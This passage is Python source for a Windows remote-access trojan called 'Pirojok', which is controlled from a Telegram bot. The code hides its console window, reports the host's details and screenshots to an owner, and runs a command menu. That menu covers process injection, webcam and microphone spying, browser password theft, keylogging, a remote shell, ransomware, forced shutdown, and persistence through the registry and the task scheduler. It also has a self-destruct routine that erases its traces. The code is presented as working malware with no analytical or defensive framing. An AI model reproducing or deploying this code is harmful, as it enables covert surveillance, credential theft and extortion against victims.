        info.append(f"Host: {socket.gethostname()}")
        info.append(f"User: {getpass.getuser()}")
        info.append(f"Admin: {'YES' if self.admin_mode else 'NO'}")
        info.append(self.injector.check_status())
        try:
            info.append(f"IP: {requests.get('https://api.ipify.org', timeout=5).text}")
        except:
            info.append(f"IP: unknown")
        info.append(f"OS: {platform.system()} {platform.release()}")
        uptime = datetime.now() - self.startup_time
        info.append(f"Uptime: {str(uptime).split('.')[0]}")
        return "\n".join(info)
    
    def take_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=85)
            img_bytes.seek(0)
            return img_bytes.read()
        except:
            try:
                screenshot = ImageGrab.grab()
                img_bytes = io.BytesIO()
                screenshot.save(img_bytes, format='JPEG', quality=85)
                img_bytes.seek(0)
                return img_bytes.read()
            except:
                return None
    
    def on_system_startup(self):
        try:
            if os.path.exists(self.shutdown_flag):
                os.remove(self.shutdown_flag)
                return
            
            if self.started: return
            self.started = True
            
            boot_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            message = f"[PIROJOK] Started!\n"
            message += f"Boot time: {boot_time}\n"
            message += f"Host: {socket.gethostname()}\n"
            message += f"User: {getpass.getuser()}\n"
            message += f"Admin: {'YES' if self.admin_mode else 'NO'}\n"
            message += self.injector.check_status()
            self.send_message(self.owner_id, message)
            
            time.sleep(5)
            screenshot = self.take_screenshot()
            if screenshot:
                self.send_photo(self.owner_id, screenshot, "[SCREEN] Desktop after boot")
                
        except Exception as e:
            print(f"Startup error: {e}")
    
    def self_destruct(self):
        """Complete self-destruction"""
        try:
            results = []
            results.append("[SELF] Starting self-destruction...")
            
            # Remove from startup
            results.append(self.remove_all_startup())
            
            # Stop keylogger
            if self.spy.keylogger_active:
                self.spy.stop_keylogger()
                results.append("[SELF] Keylogger stopped")
            
            # Delete temp files
            temp_files = [
                self.marker_file,
                self.shutdown_flag,
                self.spy.keylog_file,
                os.path.join(tempfile.gettempdir(), "pirojok_downloads"),
                os.path.join(tempfile.gettempdir(), "pirojok_ransom.html"),
            ]
            
            deleted = 0
            for f in temp_files:
                try:
                    if os.path.isfile(f):
                        os.remove(f)
                        deleted += 1
                    elif os.path.isdir(f):
                        shutil.rmtree(f)
                        deleted += 1
                except: pass
            
            results.append(f"[SELF] Deleted {deleted} files")
            
            # Send farewell
            self.send_message(self.owner_id, "[SELF] Pirojok has eaten itself! Goodbye! 👋")
            
            # Self-destruct EXE
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
                bat_path = os.path.join(tempfile.gettempdir(), "self_destruct.bat")
                with open(bat_path, 'w') as f:
                    f.write(f'''@echo off
timeout /t 3 /nobreak > nul
del "{exe_path}"
del "%~f0"
''')
                subprocess.Popen(['cmd', '/c', bat_path], 
                               creationflags=subprocess.CREATE_NO_WINDOW)
                results.append("[SELF] EXE scheduled for deletion")
            
            print("\n".join(results))
            time.sleep(2)
            sys.exit(0)
            
        except Exception as e:
            return f"[ERROR] Self-destruct failed: {e}"
    
    def process_command(self, text, chat_id):
        if chat_id != self.owner_id:
            self.send_message(chat_id, "[ERROR] Not for you!")
            return
        
        print(f"Command: {text}")
        
        if self.processing:
            return
        
        if self.last_command == text and (datetime.now() - self.last_command_time).seconds < 2:
            print(f"Duplicate command ignored")
            return
        
        self.processing = True
        self.last_command = text
        self.last_command_time = datetime.now()
        
        try:
            # Admin commands
            admin_commands = ["inject", "service", "ransom", "ransom_start"]
            cmd_type = text.split()[0] if text else ""
            
            if cmd_type in admin_commands and not self.admin_mode:
                self.send_message(chat_id, "[ADMIN] Need admin rights. Use 'admin' first")
                self.processing = False
                return
            
            # HELP
            if text == "help" or text == "menu":
                help_text = """
🔥 PIROJOK 8.0 - PROCESS INJECTION 🔥

[💉] INJECTION:
• inject - inject into system process
• service - create hidden service
• inject_status - check injection status

[🎥] SPY:
• webcam - take photo
• mic [sec] - record microphone
• location - get location
• passwords - steal browser passwords
• clipboard - get clipboard
• keylog_start - start keylogger
• keylog_stop - stop keylogger
• keylog_get - get keylog
• keylog_clear - clear keylog

[📁] FILES:
• upload <path> - upload file
• download <url> [name] - download file
• downloads - list downloads

[💻] SHELL:
• shell <command> - execute command
• history - command history

[🔒] RANSOMWARE:
• ransom - START RANSOMWARE!
• ransom_key - show encryption key
• ransom_decrypt <key> - decrypt files

[💀] SELF DESTRUCT:
• selfdestruct - Pirojok eats itself

[⚡] POWER:
• shutdown_now - shutdown (no notification)
• reboot_now - reboot
• abort - abort shutdown

[👑] ADMIN:
• admin - request admin rights
• admin_check - check admin status

[🔄] STARTUP:
• startup_reg - add to registry
• task_logon - task scheduler
• startup_remove_all - remove all
• startup_check - check startup

[📸] BASIC:
• shot - screenshot
• info - system info
                """
                self.send_message(chat_id, help_text)
                self.processing = False
                return
            
            # INJECTION
            if text == "inject":
                result = self.cmd_inject()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "service":
                result = self.cmd_service()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "inject_status":
                result = self.cmd_inject_status()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            # SPY
            if text == "webcam":
                result = self.cmd_webcam()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text.startswith("mic"):
                parts = text.split()
                seconds = parts[1] if len(parts) > 1 else 5
                result = self.cmd_mic(seconds)
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "location":
                result = self.cmd_location()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "passwords":
                result = self.cmd_passwords()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "clipboard":
                result = self.cmd_clipboard()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "keylog_start":
                result = self.cmd_keylog_start()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "keylog_stop":
                result = self.cmd_keylog_stop()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "keylog_get":
                result = self.cmd_keylog_get()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "keylog_clear":
                result = self.cmd_keylog_clear()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            # FILES
            if text.startswith("upload"):
                parts = text.split(maxsplit=1)
                if len(parts) == 2:
                    result = self.cmd_upload(parts[1])
                    self.send_message(chat_id, result)
                else:
                    self.send_message(chat_id, "[ERROR] Use: upload <filepath>")
                self.processing = False
                return
            
            if text.startswith("download"):
                parts = text.split()
                if len(parts) >= 2:
                    url = parts[1]
                    filename = parts[2] if len(parts) > 2 else None
                    result = self.cmd_download(url, filename)
                    self.send_message(chat_id, result)
                else:
                    self.send_message(chat_id, "[ERROR] Use: download <url> [filename]")
                self.processing = False
                return
            
            if text == "downloads":
                result = self.cmd_downloads()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            # SHELL
            if text.startswith("shell"):
                cmd = text[5:].strip()
                if cmd:
                    result = self.cmd_shell(cmd)
                    self.send_message(chat_id, result)
                else:
                    self.send_message(chat_id, "[ERROR] Use: shell <command>")
                self.processing = False
                return
            
            if text == "history":
                result = self.cmd_history()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            # RANSOMWARE
            if text == "ransom" or text == "ransom_start":
                result = self.ransomware_start()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "ransom_key":
                result = self.ransomware_key()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text.startswith("ransom_decrypt"):
                parts = text.split()
                if len(parts) == 2:
                    result = self.ransomware_decrypt(parts[1])
                    self.send_message(chat_id, result)
                else:
                    self.send_message(chat_id, "[ERROR] Use: ransom_decrypt <key>")
                self.processing = False
                return
            
            # SELF DESTRUCT
            if text == "selfdestruct":
                self.send_message(chat_id, "[SELF] Pirojok is eating itself... 🍽️")
                threading.Thread(target=self.self_destruct, daemon=True).start()
                self.processing = False
                return
            
            # POWER
            if text == "shutdown_now":
                with open(self.shutdown_flag, 'w') as f:
                    f.write(f"shutdown_at:{datetime.now().isoformat()}")
                os.system("shutdown /s /f /t 0")
                self.send_message(chat_id, "[SHUTDOWN] Shutting down NOW!")
                self.processing = False
                return
            
            if text == "reboot_now":
                os.system("shutdown /r /f /t 0")
                self.send_message(chat_id, "[REBOOT] Rebooting NOW!")
                self.processing = False
                return
            
            if text == "abort":
                os.system("shutdown /a")
                if os.path.exists(self.shutdown_flag):
                    os.remove(self.shutdown_flag)
                self.send_message(chat_id, "[ABORT] Shutdown aborted")
                self.processing = False
                return
            
            # ADMIN
            if text == "admin":
                if self.admin_mode:
                    self.send_message(chat_id, "[ADMIN] Already have admin rights!")
                else:
                    self.request_admin()
                self.processing = False
                return
            
            if text == "admin_check":
                status = "YES" if self.admin_mode else "NO"
                self.send_message(chat_id, f"[ADMIN] Admin rights: {status}")
                self.processing = False
                return
            
            # STARTUP
            if text == "startup_reg":
                if getattr(sys, 'frozen', False):
                    exe_path = sys.executable
                else:
                    exe_path = os.path.abspath(__file__)
                try:
                    key = winreg.HKEY_CURRENT_USER
                    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                        winreg.SetValueEx(regkey, "Pirojok", 0, winreg.REG_SZ, f'"{exe_path}"')
                    self.send_message(chat_id, "[OK] Added to registry")
                except Exception as e:
                    self.send_message(chat_id, f"[ERROR] {e}")
                self.processing = False
                return
            
            if text == "task_logon":
                if getattr(sys, 'frozen', False):
                    exe_path = sys.executable
                else:
                    exe_path = os.path.abspath(__file__)
                try:
                    task_name = "PirojokLogon"
                    cmd = ['schtasks', '/create', '/tn', task_name, '/tr', f'"{exe_path}"',
                           '/sc', 'onlogon', '/rl', 'highest', '/f']
                    result = subprocess.run(cmd, capture_output=True, text=True)
                    if result.returncode == 0:
                        self.send_message(chat_id, "[OK] Added to task scheduler")
                    else:
                        self.send_message(chat_id, f"[ERROR] {result.stderr}")
                except Exception as e:
                    self.send_message(chat_id, f"[ERROR] {e}")
                self.processing = False
                return
            
            if text == "startup_remove_all":
                result = self.remove_all_startup()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "startup_check":
                result = self.check_startup()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            # BASIC
            if text == "shot":
                self.send_message(chat_id, "[CAM] Taking screenshot...")
                screenshot = self.take_screenshot()
                if screenshot:
                    self.send_photo(chat_id, screenshot, "[SCREEN] Screenshot")
                else:
                    self.send_message(chat_id, "[ERROR] Failed to take screenshot")
                self.processing = False
                return
            
            if text == "info":
                self.send_message(chat_id, self.get_system_info())
                self.processing = False
                return
            
            self.send_message(chat_id, f"[ERROR] Unknown command: '{text}'. Use help")
            self.processing = False
            
        except Exception as e:
            print(f"Error: {e}")
            self.processing = False
    
    def main_loop(self):
        self.on_system_startup()
        while self.running:
            try:
                url = f"{self.base_url}/getUpdates"
                params = {"offset": self.last_update_id + 1, "timeout": 30}
                response = requests.get(url, params=params, timeout=35)
                data = response.json()
                if data["ok"] and data["result"]:
                    for update in data["result"]:
                        self.last_update_id = update["update_id"]
                        if "message" in update and "text" in update["message"]:
                            thread = threading.Thread(target=self.process_command,
                                args=(update["message"]["text"], update["message"]["chat"]["id"]))
                            thread.daemon = True
                            thread.start()
                time.sleep(1)
            except Exception as e:
                print(f"Loop error: {e}")
                time.sleep(5)
    
    def run(self):
        try:
            self.admin_mode = self.check_admin()
            self.main_loop()
        except KeyboardInterrupt:
            self.running = False
            self.send_message(self.owner_id, "[PIROJOK] Stopped")

if __name__ == "__main__":
    # Скрываем консоль
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    pirojok = Pirojok()
    pirojok.run()
